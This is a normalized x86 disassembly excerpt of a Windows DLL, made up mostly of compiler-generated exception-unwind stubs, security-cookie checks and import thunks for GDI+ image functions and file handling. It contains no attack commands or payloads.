push [ ebp + 0x8 ]
call sub_100295b7
add esp 0xc
pop ebp
retn
sub_100290eb
push 0xa
call sub_10023ee6
pop ecx
retn
sub_100291f0
push 0x1
call sub_10023ee6
pop ecx
retn
sub_1002934b
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100274c1
pop ecx
pop ecx
retn
sub_1002937a
push 0x1
call sub_10023ee6
pop ecx
retn
sub_10029383
push 0x1
call sub_100292a9
pop ecx
retn
sub_1002b671
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_1002b690
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_1002b780
push esi
call sub_10027485
pop ecx
retn
sub_1002b859
push ebx
call sub_100290f4
pop ecx
retn
sub_1002ba72
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1002bc4c
push ebx
call sub_100290f4
pop ecx
retn
GdipFree
jmp [ GdipFree@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipCreateBitmapFromHBITMAP
jmp [ GdipCreateBitmapFromHBITMAP@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GetProcessImageFileNameW
jmp [ GetProcessImageFileNameW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1002bcd0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bcf0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bd10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bd30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bd50
lea ecx [ ebp - 0x20 ]
jmp sub_100132b0
sub_1002bd58
lea ecx [ ebp - 0x28 ]
jmp sub_100132b0
sub_1002bd60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bd80
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_100032f0
sub_1002bd8b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bdb0
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002bdc1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bde0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002be00
lea ecx [ ebp - 0x5c ]
jmp sub_10002720
sub_1002be08
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002be30
lea ecx [ ebp - 0x34 ]
jmp sub_10002720
sub_1002be38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002be60
lea ecx [ ebp + 0x8 ]
jmp sub_10002720
sub_1002be68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002be90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002beb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bed0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bef0
lea ecx [ ebp + 0x8 ]
jmp sub_100132b0
sub_1002bef8
lea ecx [ ebp - 0x1c ]
jmp sub_100132b0
sub_1002bf00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bf20
lea ecx [ ebp + 0x8 ]
jmp sub_100132b0
sub_1002bf28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bf50
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002bf61
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bf80
mov eax [ ebp - 0x1c ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002bf8b
lea ecx [ ebp - 0x24 ]
jmp sub_100132b0
sub_1002bf93
mov eax [ ebp - 0x1c ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002bf9e
mov eax [ ebp - 0x1c ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002bfa9
lea ecx [ ebp - 0x2c ]
jmp sub_100132b0
sub_1002bfb1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002bfd0
lea ecx [ ebp - 0x24 ]
jmp sub_100132b0
sub_1002bfd8
lea ecx [ ebp - 0x2c ]
jmp sub_100132b0
sub_1002bfe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c000
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002c011
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c030
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c050
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c070
lea ecx [ ebp + 0x8 ]
jmp sub_10002720
sub_1002c078
mov eax [ ebp - 0x18 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c083
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c0a0
lea ecx [ ebp - 0x40 ]
jmp sub_100047d0
sub_1002c0a8
lea ecx [ ebp - 0x30 ]
jmp sub_100132b0
sub_1002c0b0
mov eax [ ebp - 0x20 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c0bb
lea ecx [ ebp - 0x24 ]
jmp sub_100132b0
sub_1002c0c3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c0e0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002c0f1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002c102
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c120
lea ecx [ ebp - 0x40 ]
jmp sub_10002720
sub_1002c128
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002c130
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c160
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002c171
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c190
lea ecx [ ebp - 0x28 ]
jmp sub_10002720
sub_1002c198
mov eax [ ebp - 0x14 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c1a3
lea ecx [ ebp - 0x3c ]
jmp sub_10002720
sub_1002c1ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c1d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c1f0
mov ecx [ ebp - 0x70 ]
add ecx 0x24
jmp sub_100032f0
sub_1002c1fb
mov ecx [ ebp - 0x70 ]
add ecx 0x38
jmp sub_100032f0
sub_1002c206
mov ecx [ ebp - 0x70 ]
add ecx 0x4c
jmp sub_10005ca0
sub_1002c211
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c21c
mov eax [ ebp - 0x68 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c227
mov eax [ ebp - 0x68 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c232
mov eax [ ebp - 0x68 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c23d
mov eax [ ebp - 0x68 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c248
mov eax [ ebp - 0x68 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c253
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c280
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_100032f0
sub_1002c28b
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_100032f0
sub_1002c296
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_10005ca0
sub_1002c2a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c2c0
lea ecx [ ebp - 0x34 ]
jmp sub_10002720
sub_1002c2c8
lea ecx [ ebp - 0x20 ]
jmp sub_10002720
sub_1002c2d0
lea ecx [ ebp - 0x48 ]
jmp sub_10002720
sub_1002c2d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c300
lea ecx [ ebp + 0x8 ]
jmp sub_100132b0
sub_1002c308
lea ecx [ ebp - 0x2c ]
jmp sub_10002720
sub_1002c310
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c330
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c350
lea ecx [ ebp + 0x8 ]
jmp sub_100018c0
sub_1002c358
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c380
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10001040
add esp 0x8
retn
sub_1002c391
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c3b0
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002c3b8
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002c3c0
lea ecx [ ebp - 0xa8 ]
jmp sub_100032c0
sub_1002c3cb
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002c3d3
lea ecx [ ebp - 0x64 ]
jmp sub_100032c0
sub_1002c3db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xac ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c410
mov ecx [ ebp - 0x10 ]
jmp sub_10006cd0
sub_1002c418
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c440
mov ecx [ ebp - 0x14 ]
add ecx 0xc
jmp sub_100018c0
sub_1002c44b
mov ecx [ ebp - 0x14 ]
add ecx 0x2c
jmp sub_10007e30
sub_1002c456
mov eax [ ebp - 0x10 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c461
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c480
mov eax [ ebp - 0x3c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x3c ] 0xfffffffe
mov ecx [ ebp - 0x38 ]
jmp sub_100026a0
sub_1002c499
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002c4a1
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002c4a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c4d0
mov eax [ ebp - 0x68 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c4db
lea ecx [ ebp - 0x7c ]
jmp sub_100026a0
sub_1002c4e3
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c4eb
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c4f3
lea ecx [ ebp - 0x7c ]
jmp sub_100026a0
sub_1002c4fb
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c503
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c50b
lea ecx [ ebp - 0x7c ]
jmp sub_100026a0
sub_1002c513
lea ecx [ ebp - 0x48 ]
jmp sub_100018c0
sub_1002c51b
lea ecx [ ebp - 0x64 ]
jmp sub_100018c0
sub_1002c523
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002c52b
lea ecx [ ebp - 0x7c ]
jmp sub_100026a0
sub_1002c533
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c53b
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c543
lea ecx [ ebp - 0x8c ]
jmp sub_100026a0
sub_1002c54e
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c556
mov ecx [ ebp - 0x68 ]
jmp sub_100018c0
sub_1002c55e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c590
lea ecx [ ebp - 0x24 ]
jmp sub_100132b0
sub_1002c598
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c5c0
mov eax [ ebp - 0x10 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c5cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c5f0
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_100199ff
sub_1002c5fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c620
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c640
mov ecx [ ebp - 0x10 ]
jmp sub_100193bf
sub_1002c648
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100098c0
sub_1002c653
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_100098c0
sub_1002c65e
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_100098c0
sub_1002c669
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100098c0
sub_1002c674
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c690
mov ecx [ ebp - 0x10 ]
jmp sub_100193bf
sub_1002c698
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_100098c0
sub_1002c6a3
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_100098c0
sub_1002c6ae
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_100098c0
sub_1002c6b9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_100098c0
sub_1002c6c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c6e0
mov eax [ ebp - 0x10 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c6eb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c710
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_10009380
sub_1002c71b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c740
lea ecx [ ebp - 0x18 ]
jmp sub_100193bf
sub_1002c748
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c770
mov eax [ ebp - 0x10 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c77b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c7a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c7c0
lea ecx [ ebp - 0x10 ]
jmp sub_100092d0
sub_1002c7c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c7f0
mov eax [ ebp - 0x14 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002c7fb
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x38 ]
jmp sub_1000a5b0
sub_1002c814
mov ecx [ ebp - 0x14 ]
jmp sub_100092c0
sub_1002c81c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c840
mov ecx [ ebp - 0x10 ]
jmp sub_10009440
sub_1002c848
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c870
lea ecx [ ebp - 0x2c ]
jmp sub_10009440
sub_1002c878
lea ecx [ ebp - 0x2c ]
jmp sub_1000b470
sub_1002c880
lea ecx [ ebp - 0x1c ]
jmp sub_100092d0
sub_1002c888
lea ecx [ ebp - 0x2c ]
jmp sub_10009440
sub_1002c890
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c8b0
lea ecx [ ebp - 0x58 ]
jmp sub_100092d0
sub_1002c8b8
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002c8c0
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002c8c8
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002c8d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c900
lea ecx [ ebp - 0x70 ]
jmp sub_100092d0
sub_1002c908
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002c910
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002c918
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x88 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c940
lea ecx [ ebp - 0x40 ]
jmp sub_100092d0
sub_1002c948
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002c950
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c980
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002c988
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002c990
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002c998
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002c9c0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_100032c0
sub_1002c9d9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002ca00
mov eax [ ebp - 0x88 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002ca0e
lea ecx [ ebp - 0x2c ]
jmp sub_100018c0
sub_1002ca16
lea ecx [ ebp - 0x80 ]
jmp sub_100032c0
sub_1002ca1e
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002ca26
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002ca2e
lea ecx [ ebp - 0x64 ]
jmp sub_100032c0
sub_1002ca36
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002ca60
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x60
jmp sub_10009360
sub_1002ca7c
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_10009370
sub_1002ca87
mov ecx [ ebp - 0x14 ]
add ecx 0x18
jmp sub_10009380
sub_1002ca92
mov ecx [ ebp - 0x18 ]
jmp sub_100098e0
sub_1002ca9a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002cac0
mov eax [ ebp - 0x1f8 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002cace
lea ecx [ ebp - 0x200 ]
jmp sub_100132b0
sub_1002cad9
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002cae1
lea ecx [ ebp - 0x2b8 ]
jmp sub_1000ae80
sub_1002caec
lea ecx [ ebp - 0xb8 ]
jmp sub_100032c0
sub_1002caf7
lea ecx [ ebp - 0x198 ]
jmp sub_100032c0
sub_1002cb02
lea ecx [ ebp - 0x160 ]
jmp sub_100032c0
sub_1002cb0d
lea ecx [ ebp - 0xf0 ]
jmp sub_100032c0
sub_1002cb18
lea ecx [ ebp - 0xd4 ]
jmp sub_100032c0
sub_1002cb23
lea ecx [ ebp - 0x17c ]
jmp sub_100032c0
sub_1002cb2e
lea ecx [ ebp - 0x144 ]
jmp sub_100032c0
sub_1002cb39
lea ecx [ ebp - 0x1ec ]
jmp sub_100032c0
sub_1002cb44
lea ecx [ ebp - 0x1b4 ]
jmp sub_100032c0
sub_1002cb4f
lea ecx [ ebp - 0x2c ]
jmp sub_100032c0
sub_1002cb57
lea ecx [ ebp - 0x80 ]
jmp sub_100032c0
sub_1002cb5f
lea ecx [ ebp - 0x9c ]
jmp sub_100032c0
sub_1002cb6a
lea ecx [ ebp - 0x128 ]
jmp sub_100032c0
sub_1002cb75
lea ecx [ ebp - 0x1d0 ]
jmp sub_100032c0
sub_1002cb80
lea ecx [ ebp - 0x10c ]
jmp sub_100032c0
sub_1002cb8b
lea ecx [ ebp - 0x64 ]
jmp sub_100032c0
sub_1002cb93
lea ecx [ ebp - 0x48 ]
jmp sub_100032c0
sub_1002cb9b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2bc ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002cbd0
mov eax [ ebp - 0x90 ]
push eax
call sub_10019ce4
pop ecx
retn
sub_1002cbde
lea ecx [ ebp - 0x50 ]
jmp sub_100032c0
sub_1002cbe6
lea ecx [ ebp - 0x88 ]
jmp sub_100032c0
sub_1002cbf1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_1001a809
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002cc20
lea ecx [ ebp + 0x8 ]
jmp sub_100132b0
sub_1002cc28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1001a809
mov eax r--data
jmp sub_1001a4b2
sub_1002cc50
mov ecx [ ebp - 0x3c ]
add ecx 0x8
jmp sub_10008d20
sub_1002cc5b
mov ecx [ ebp - 0x3c ]
add ecx 0x30
jmp sub_1000f790
sub_1002cc66
mov ecx [ ebp - 0x3c ]
add ecx 0x48
jmp sub_10007e30
sub_1002cc71
